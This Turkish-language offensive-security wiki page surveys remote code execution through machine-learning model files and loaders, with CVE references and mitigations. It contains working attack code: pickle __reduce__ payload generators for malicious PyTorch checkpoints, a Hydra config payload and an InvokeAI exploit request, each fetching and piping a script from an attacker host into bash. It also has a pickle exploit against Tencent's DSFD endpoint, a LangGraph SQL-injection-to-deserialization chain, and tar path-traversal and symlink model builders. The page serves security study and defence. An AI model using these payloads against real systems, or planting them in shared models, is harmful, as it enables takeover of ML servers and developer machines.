# Models RCE

{{#include ../banners/hacktricks-training.md}}

## RCE için modelleri yükleme

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklı formatlarda paylaşılır. Bu modeller, kullanılmak üzere geliştiricilerin makinelerine veya production sistemlerine yüklenebilir. Normalde modeller kötü amaçlı kod içermemelidir; ancak bazı durumlarda model, amaçlanan bir özellik olarak veya model yükleme kütüphanesindeki bir güvenlik açığı nedeniyle sistem üzerinde arbitrary code execution gerçekleştirmek için kullanılabilir.

Aşağıdaki tablo bu kategorideki örnek niteliğindeki güvenlik açıklarını listeler:

| **Framework / Tool**        | **Güvenlik Açığı (varsa CVE)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | `torch.load` içinde *insecure deserialization* **(CVE-2025-32434)**                                                              | Model checkpoint içindeki malicious pickle, (`weights_only` güvenlik önlemini bypass ederek) code execution sağlar                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download code execution'a neden olur; management API'de Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` üzerinden unsafe checkpoint deserialization **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint, `load_model_trainer_states_from_checkpoint` sırasında pickle reducer'ı tetikleyerek ML worker içinde code execution sağlar            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | Unsafe MessagePack extension hook + SQLi **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kullanıcı tarafından kontrol edilen `filter` anahtarı SQL/JSON-path syntax enjekte eder, `UNION SELECT` sahte bir checkpoint satırı oluşturur, ardından `msgpack` deserialization işlemi attacker tarafından seçilen Python kodunu import edip çağırır | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'den model yüklemek `yaml.unsafe_load` kullanır (code exec) <br> **Lambda** layer'ı ile model yüklemek arbitrary Python code çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Hazırlanmış `.tflite` modeli integer overflow'ı tetikleyerek heap corruption'a neden olur (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` üzerinden model yüklemek, saldırganın `__reduce__` payload'ını içeren pickle'ı çalıştırır                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` varsayılan olarak pickled object array'lerine izin veriyordu – malicious `.npy/.npz` code exec'i tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights path'i dizin dışına çıkabilir (arbitrary files okur) <br> Malicious ONNX model tar'ı arbitrary files'ları overwrite edebilir (RCE'ye yol açar) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator içeren model, attacker'ın native code'unun yüklenmesini gerektirir; karmaşık model graph'leri unintended computations gerçekleştirmek için logic'i abuse eder   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkinleştirilmişken model-load API kullanmak, relative path traversal ile dosya yazılmasına izin verir (ör. RCE için `.bashrc` overwrite etmek)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model dosyası parser içinde heap buffer overflow'larına neden olarak victim system üzerinde arbitrary code execution sağlar                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layer içeren malicious HDF5 (`.h5`) modeli yükleme sırasında code execution gerçekleştirmeye devam eder (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Birçok ML tool'u (ör. pickle-based model format'ları ve Python `pickle.load`), mitigation uygulanmadığı sürece model dosyalarına gömülü arbitrary code'u çalıştırır | |
| **NeMo / uni2TS / FlexTok (Hydra)** | `hydra.utils.instantiate()` işlevine aktarılan untrusted metadata **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Saldırgan tarafından kontrol edilen model metadata/config'i `_target_` değerini arbitrary callable'a (ör. `builtins.exec`) ayarlar → “safe” format'larda bile (`.safetensors`, `.nemo`, repo `config.json`) yükleme sırasında çalıştırılır | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ayrıca, [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi, `weights_only=True` ile yüklenmediği takdirde sistem üzerinde arbitrary code execution gerçekleştirmek için kullanılabilecek Python pickle tabanlı bazı modeller vardır. Bu nedenle pickle tabanlı herhangi bir model, yukarıdaki tabloda listelenmemiş olsa bile bu tür saldırılara karşı özellikle susceptible olabilir.

### Hydra metadata → RCE (safetensors ile bile çalışır)

`hydra.utils.instantiate()`, bir configuration/metadata object içindeki dotted `_target_` değerlerini import eder ve çağırır. Hugging Face Transformers gibi kütüphaneler **untrusted model metadata**'sını `instantiate()` işlevine aktardığında, saldırgan model yükleme sırasında hemen çalışacak bir callable ve arguments sağlayabilir (pickle gerekmez).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload örneği (`.nemo` `model_config.yaml`, repo `config.json` veya `.safetensors` içindeki `__metadata__` ile çalışır):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Ana noktalar:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok loaders içinde model initialization öncesinde tetiklenir.
- Hydra’nın string block-list’i alternatif import path’leri (ör. `enum.bltns.eval`) veya application tarafından çözümlenen adlar (ör. `nemo.core.classes.common.os.system` → `posix`) kullanılarak aşılabilir.<sup>[[14]](#references)</sup>
- FlexTok ayrıca stringleştirilmiş metadata’yı `ast.literal_eval` ile ayrıştırır; bu da Hydra çağrısından önce DoS’a (CPU/memory blowup) olanak sağlar.

### 🆕  `torch.load` aracılığıyla InvokeAI RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir open-source web interface’tir. **5.3.1 – 5.4.2** sürümleri, kullanıcıların arbitrary URL’lerden model download edip load etmesine olanak tanıyan `/api/v2/models/install` REST endpoint’ini açığa çıkarır.<sup>[[1]](#references)</sup>

Endpoint dahili olarak sonunda şunu çağırır:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Sağlanan dosya bir **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` bir **pickle deserialization** işlemi gerçekleştirir. İçerik doğrudan kullanıcı kontrollü URL'den geldiği için saldırgan, checkpoint içine özel bir `__reduce__` metoduna sahip kötü amaçlı bir nesne yerleştirebilir; bu metot **deserialization sırasında** çalıştırılarak InvokeAI sunucusunda **uzak kod yürütmeye (RCE)** yol açar.

Güvenlik açığı **CVE-2024-12029** olarak atanmıştır (CVSS 9.8, EPSS 61.17 %).

#### Exploitation adım adım

1. Kötü amaçlı bir checkpoint oluşturun:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` dosyasını kontrol ettiğiniz bir HTTP server üzerinde barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Savunmasız endpoint'i tetikleyin (authentication gerekmez):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan, InvokeAI process'i bağlamında code execution elde eder.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.<sup>[[3]](#references)</sup>

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag varsayılan olarak **false**)
•  `/api/v2/models/install` saldırgan tarafından erişilebilir olmalı
•  Process'in shell komutlarını çalıştırma izinleri olmalı

#### Azaltımlar

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – patch, varsayılan olarak `scan=True` ayarlar ve deserialization öncesinde malware scanning gerçekleştirir.<sup>[[2]](#references)</sup>
* Checkpoint'leri programmatically yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper'ını kullanın.
* Model kaynakları için allow-list'ler / signature'lar uygulayın ve service'i least-privilege ile çalıştırın.

> ⚠️ **Herhangi** bir Python pickle-tabanlı formatın (birçok `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) untrusted kaynaklardan deserialize edilmesinin inherently unsafe olduğunu unutmayın.

---

Daha eski InvokeAI sürümlerini reverse proxy arkasında çalışır durumda tutmanız gerekiyorsa kullanılabilecek ad-hoc mitigation örneği:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’nın Merlin’in bir parçası olan Transformers4Rec’i, kullanıcı tarafından sağlanan path’ler üzerinde doğrudan `torch.load()` çağıran güvenli olmayan bir checkpoint loader içeriyordu. `torch.load`, Python `pickle` altyapısına dayandığından, saldırgan tarafından kontrol edilen bir checkpoint, deserialization sırasında bir reducer aracılığıyla arbitrary code çalıştırabilir.<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Bunun RCE’ye yol açmasının nedeni: Python pickle’da bir nesne, bir callable ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Callable, unpickling sırasında çalıştırılır. Böyle bir nesne bir checkpoint içinde bulunuyorsa, herhangi bir weights kullanılmadan önce çalışır.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Teslimat vektörleri ve etki alanı:
- Repo'lar, bucket'lar veya artifact registry'leri üzerinden paylaşılan Trojanized checkpoint/model'ler
- Checkpoint'leri otomatik olarak yükleyen otomatik resume/deploy pipeline'ları
- Çalıştırma, genellikle yükseltilmiş ayrıcalıklara sahip training/inference worker'larının içinde gerçekleşir (ör. container'larda root)

Düzeltme: [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) commit'i (PR #802), doğrudan `torch.load()` kullanımını `transformers4rec/utils/serialization.py` içinde uygulanan, kısıtlı ve allow-list kullanan bir deserializer ile değiştirdi. Yeni loader, türleri/alanları doğrular ve load sırasında arbitrary callable'ların çağrılmasını engeller.<sup>[[7]](#references)</sup>

PyTorch checkpoint'lerine özgü defensive guidance:
- Güvenilmeyen verileri unpickle etmeyin. Mümkün olduğunda [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi executable olmayan formatları tercih edin.
- PyTorch serialization kullanmanız gerekiyorsa `weights_only=True` seçeneğinin etkin olduğundan emin olun (daha yeni PyTorch sürümlerinde desteklenir) veya Transformers4Rec patch'ine benzer, custom ve allow-list kullanan bir unpickler kullanın.<sup>[[4]](#references)</sup>
- Model provenance/signature'larını zorunlu kılın ve deserialization işlemini sandbox içinde çalıştırın (seccomp/AppArmor; root olmayan kullanıcı; kısıtlı FS ve network egress olmadan).
- Checkpoint load sırasında ML servislerinden başlatılan beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanımını trace edin.

POC ve vulnerable/patch referansları:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Örnek – malicious PyTorch model oluşturma

- Modeli oluşturun:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modeli yükleyin:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD’si, kullanıcı tarafından kontrol edilen verilerin deserialization işleminden geçirildiği bir `resnet` endpoint’i sunar. ZDI, uzaktaki bir saldırganın kurbanı kötü amaçlı bir sayfa/dosya yüklemeye zorlayabileceğini, bu sayfa/dosyanın söz konusu endpoint’e hazırlanmış bir serialized blob göndermesini sağlayabileceğini ve `root` olarak deserialization işlemini tetikleyerek sistemin tamamen ele geçirilmesine yol açabileceğini doğruladı.

Exploit akışı, tipik pickle abuse yöntemini izler:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Deserialization sırasında erişilebilen herhangi bir gadget (constructor'lar, `__setstate__`, framework callback'leri vb.), transport HTTP, WebSocket veya watched directory'ye bırakılan bir file olsun ya da olmasın aynı şekilde weaponize edilebilir.



### LangGraph checkpointer SQLi → MessagePack RCE

Bu attack chain ilginçtir; çünkü attacker'ın **malicious bir model file upload etmesine gerek yoktur**. Bunun yerine uygulama bir **AI-agent persistence API** (`get_state_history(..., filter=...)`) sunar ve user input checkpointer query builder'a ulaşır.

#### 1. Metadata filter'larında structural SQLi

Vulnerable bir SQLite pattern'i şu şekilde görünüyordu:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Değer daha sonra bağlanır, ancak `query_key`, **JSON path string** içine birleştirilir; bu nedenle dictionary key içindeki bir `'`, `'$.{query_key}'` ifadesinden çıkarak SQL injection gerçekleştirir. Aynı ders **JSON path'leri, identifier'ları, operator'leri, `LIMIT` ve TTL alanları** için de geçerlidir: placeholder'lar yalnızca değerleri korur, yapısal query syntax'ını değil.

#### 2. `UNION SELECT` yalnızca data theft için değil, downstream sink'leri hedeflemek için de kullanılabilir

Query, `type` ve daha sonra şu şekilde tüketilen serialize edilmiş `checkpoint` byte'larını döndürür:
```python
self.serde.loads_typed((type, checkpoint))
```
Bu, `WHERE` koşulundaki bir SQLi'nin **sahte bir sonuç satırı** enjekte edebileceği anlamına gelir:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Daha sonraki kod seçilen herhangi bir sütunu parse ediyor, deserialize ediyor, yazıyor veya execute ediyorsa bu sütunları sink'leriyle eşleştirin. Bu durumda sahte satır, SQLi'yi **attacker-controlled deserialization**'a dönüştürür.

#### 3. Güvensiz MessagePack extension hook'ları code gadget'lara eşdeğerdir

LangGraph'in `msgpack` yolu, iç içe bir tuple'ı unpack eden ve şunu execute eden özel bir extension hook kullanıyordu:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Yani `("os", "system", "id > /tmp/pwned")` ile eşdeğer bir MessagePack extension object encoding, `os` modülünü import eder, `system` işlevini çözümler ve komutu çalıştırır. AI framework'lerini incelerken, dynamic imports, reflection veya arbitrary callable dispatch için **custom MessagePack/JSON/pickle revivers**'ları kontrol edin.

#### 4. Agent framework'leri için pratik audit yöntemi

User-controlled input'un aşağıdakilere ulaştığı tüm noktaları inceleyin:
- state history / memory / replay / checkpoint listing API'leri
- SQL veya Redis query fragment'ları oluşturan structured filter builder'lar
- custom deserializer'lar (`pickle`, `msgpack`, `json` object hook'ları, YAML constructor'ları)
- persistence layer'dan döndürülen row'lara güvenen recovery path'leri

Bu özel chain, güvenilmeyen kullanıcıların `filter` değerini kontrol edebildiği **SQLite** veya **Redis** checkpointer'larını kullanan self-hosted LangGraph deployment'larını etkiledi. Disclosure'da belirtilen patched version'lar `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` ve `langgraph-checkpoint 4.0.1+` idi.<sup>[[15]](#references)</sup>

## Models ile Path Traversal

[**bu blog yazısında**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği üzere, farklı AI framework'leri tarafından kullanılan çoğu model formatı archive'lar, genellikle `.zip`, temel alınarak oluşturulmuştur. Bu nedenle, bu formatların abuse edilerek Path Traversal attack'leri gerçekleştirilmesi ve modelin yüklendiği sistemden arbitrary file'ların okunması mümkün olabilir.<sup>[[16]](#references)</sup>

Örneğin, aşağıdaki code ile yüklendiğinde `/tmp` directory'sinde bir file oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Veya aşağıdaki kodla, yüklendiğinde `/tmp` dizinine bir symlink oluşturacak bir model oluşturabilirsiniz:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Derinlemesine inceleme: Keras .keras deserialization ve gadget hunting

.kera'ların dahili yapısı, Lambda-layer RCE, ≤ 3.8 sürümlerindeki arbitrary import sorunu ve düzeltme sonrası allowlist içinde gadget discovery hakkında odaklanmış bir rehber için bkz.:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blogu – "CVE-2024-12029 – Güvenilmeyen Verilerin InvokeAI Deserialization'ı](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load için güvenlik hususları](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blogu – CVE-2025-23298: NVIDIA Merlin'de Remote Code Execution elde edilmesi](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Yama öncesi güvenlik açığı bulunan loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kötücül checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Yama sonrası loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Modern AI/ML formatları ve kütüphaneleriyle Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate belgeleri](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (RCE uyarısı)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi'den RCE'ye: LangGraph'ın Checkpointer'ını istismar etmek](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip açıklarını yüksek değerli AI/ML ödüllerine yönlendirmek](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
